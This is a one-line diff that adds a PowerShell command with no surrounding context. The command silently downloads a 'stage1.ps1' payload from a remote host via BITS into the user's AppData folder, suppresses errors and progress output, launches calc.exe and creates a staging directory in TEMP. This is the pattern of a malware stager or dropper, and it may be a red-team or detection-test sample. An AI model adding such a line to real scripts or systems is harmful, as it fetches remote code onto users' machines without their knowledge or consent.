@@ -1,0 +1,1 @@
+$RemoteUrl = 'http://internal.corp/stage1.ps1'; $LocalPath = "$env:APPDATA\stage1.bin"; $ConnectionTimeout = 74; Start-BitsTransfer -Source $RemoteUrl -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
